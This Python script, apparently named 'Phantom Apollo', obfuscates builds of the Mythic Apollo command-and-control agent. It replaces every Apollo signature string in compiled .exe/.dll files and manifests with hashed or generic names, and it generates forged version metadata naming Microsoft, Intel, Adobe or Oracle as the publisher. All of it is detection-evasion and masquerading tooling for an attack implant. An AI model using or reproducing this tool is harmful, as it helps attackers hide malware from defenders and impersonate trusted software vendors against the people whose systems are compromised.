#!/usr/bin/env python3
"""
Binary-Level Obfuscator for Phantom Apollo
Removes ALL Apollo references from compiled executables
"""

import os
import re
import hashlib
import random
import string
import shutil
from pathlib import Path

class BinaryObfuscator:
    def __init__(self):
        self.apollo_signatures = [
            b"Apollo",
            b"apollo", 
            b"APOLLO",
            b"ApolloInterop",
            b"Apollo.exe",
            b"Apollo Agent",
            b"Apollo C2",
            b"Mythic Apollo",
            b"costura.apollointerop",
            b"HttpTransport.HttpProfile",
            b"PSKCryptography",
            b"ApolloStructs",
            b"ApolloEnums",
            b"ApolloLogonInformation"
        ]
        
        self.replacement_map = {}
        self.generate_replacements()
    
    def generate_replacements(self):
        """Generate secure hash-based replacements for Apollo signatures"""
        for signature in self.apollo_signatures:
            # Generate deterministic but obfuscated replacement
            hash_input = signature + b"phantom_salt_2024"
            hash_hex = hashlib.sha256(hash_input).hexdigest()[:len(signature)]
            
            # Ensure replacement maintains similar structure
            if b"." in signature:
                parts = signature.split(b".")
                replacement_parts = []
                for part in parts:
                    part_hash = hashlib.md5(part + b"_phantom").hexdigest()[:len(part)]
                    replacement_parts.append(part_hash.encode())
                replacement = b".".join(replacement_parts)
            else:
                replacement = hash_hex.encode()
            
            self.replacement_map[signature] = replacement
            print(f"[+] Mapping: {signature.decode(errors='ignore')} -> {replacement.decode(errors='ignore')}")
    
    def obfuscate_binary(self, file_path):
        """Obfuscate binary by replacing Apollo signatures"""
        print(f"[+] Obfuscating binary: {file_path}")
        
        if not os.path.exists(file_path):
            print(f"[-] File not found: {file_path}")
            return False
        
        # Read binary file
        with open(file_path, 'rb') as f:
            data = f.read()
        
        original_size = len(data)
        
        # Replace all Apollo signatures
        for signature, replacement in self.replacement_map.items():
            if signature in data:
                print(f"[+] Replacing {len(re.findall(re.escape(signature), data))} instances of {signature.decode(errors='ignore')}")
                data = data.replace(signature, replacement.ljust(len(signature), b'\x00'))
        
        # Additional PE metadata obfuscation
        data = self.obfuscate_pe_metadata(data)
        
        # Write obfuscated binary
        backup_path = file_path + ".backup"
        shutil.copy2(file_path, backup_path)
        
        with open(file_path, 'wb') as f:
            f.write(data)
        
        print(f"[+] Binary obfuscated: {original_size} bytes -> {len(data)} bytes")
        print(f"[+] Backup saved: {backup_path}")
        return True
    
    def obfuscate_pe_metadata(self, data):
        """Obfuscate PE metadata and version information"""
        # Common PE metadata patterns
        metadata_patterns = [
            (b"Copyright \xA9 2021", b"Copyright \xA9 2024"),
            (b"Apollo", b"System"),
            (b"Apollo.exe", b"System.exe"),
            (b"Original Name", b"System Name"),
            (b"Internal Name", b"System Name"),
            (b"Product", b"Service"),
            (b"Description", b"Component"),
        ]
        
        for pattern, replacement in metadata_patterns:
            if pattern in data:
                data = data.replace(pattern, replacement.ljust(len(pattern), b'\x00'))
        
        return data
    
    def obfuscate_assembly_manifest(self, manifest_path):
        """Obfuscate .NET assembly manifest"""
        if not os.path.exists(manifest_path):
            return
        
        print(f"[+] Obfuscating assembly manifest: {manifest_path}")
        
        with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Replace Apollo references in manifest
        replacements = {
            'Apollo': 'System',
            'apollo': 'system',
            'APOLLO': 'SYSTEM',
            'ApolloInterop': 'SystemInterop',
            'HttpTransport': 'NetTransport',
            'PSKCryptography': 'SysCryptography'
        }
        
        for old, new in replacements.items():
            content = content.replace(old, new)
        
        with open(manifest_path, 'w', encoding='utf-8') as f:
            f.write(content)
    
    def process_build_directory(self, build_dir):
        """Process entire build directory for obfuscation"""
        print(f"[+] Processing build directory: {build_dir}")
        
        if not os.path.exists(build_dir):
            print(f"[-] Build directory not found: {build_dir}")
            return False
        
        # Find all PE files
        pe_files = []
        for root, dirs, files in os.walk(build_dir):
            for file in files:
                if file.endswith(('.exe', '.dll')):
                    pe_files.append(os.path.join(root, file))
        
        # Obfuscate each PE file
        for pe_file in pe_files:
            self.obfuscate_binary(pe_file)
        
        # Find and obfuscate manifests
        for root, dirs, files in os.walk(build_dir):
            for file in files:
                if file.endswith('.manifest'):
                    manifest_path = os.path.join(root, file)
                    self.obfuscate_assembly_manifest(manifest_path)
        
        return True
    
    def create_phantom_metadata(self, exe_path):
        """Create legitimate-looking metadata for the executable"""
        print(f"[+] Creating phantom metadata for: {exe_path}")
        
        # Generate legitimate-looking names
        company_names = ["Microsoft Corporation", "Intel Corporation", "Adobe Systems", "Oracle Corporation"]
        product_names = ["System Service", "Driver Component", "Network Service", "Security Module"]
        
        company = random.choice(company_names)
        product = random.choice(product_names)
        
        # Create version info template (would need additional tools like ResourceHacker)
        version_template = f"""
        CompanyName: {company}
        FileDescription: {product}
        FileVersion: 10.0.{random.randint(1000, 9999)}.{random.randint(100, 999)}
        InternalName: system
        LegalCopyright: Copyright (C) {random.randint(2020, 2024)} {company}
        OriginalFilename: system.exe
        ProductName: {product}
        ProductVersion: 10.0.{random.randint(1000, 9999)}.{random.randint(100, 999)}
        """
        
        print(f"[+] Generated metadata:\n{version_template}")
        return version_template

def main():
    """Main obfuscation function"""
    obfuscator = BinaryObfuscator()
    
    # Test with current apollo build
    apollo_build_dir = "apollo/agent_code/Apollo/bin"
    if os.path.exists(apollo_build_dir):
        obfuscator.process_build_directory(apollo_build_dir)
    
    # Also check for common build output locations
    common_paths = [
        "apollo/agent_code/Apollo/bin/Release",
        "apollo/agent_code/Apollo/bin/Debug", 
        "apollo/agent_code/Apollo/obj",
        "."  # Current directory for any .exe files
    ]
    
    for path in common_paths:
        if os.path.exists(path):
            obfuscator.process_build_directory(path)
    
    print("[+] Binary obfuscation complete!")

if __name__ == "__main__":
    main()